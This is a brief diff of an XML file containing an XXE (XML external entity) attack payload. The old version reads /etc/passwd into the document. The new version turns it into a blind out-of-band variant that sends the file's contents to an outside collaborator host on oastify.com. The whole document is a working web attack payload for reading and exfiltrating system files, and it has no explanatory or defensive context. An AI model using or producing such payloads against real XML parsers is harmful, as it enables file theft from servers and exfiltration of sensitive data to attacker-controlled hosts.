@@ -1,5 +1,6 @@
 
 <?xml version="1.0"?>
-<!DOCTYPE foo [  
+<!DOCTYPE foo [
 <!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://tc91bso0lwoyjtxi2pz7r7lyepkg8hw6.oastify.com/?%xxe;">]><foo>&blind;</foo>
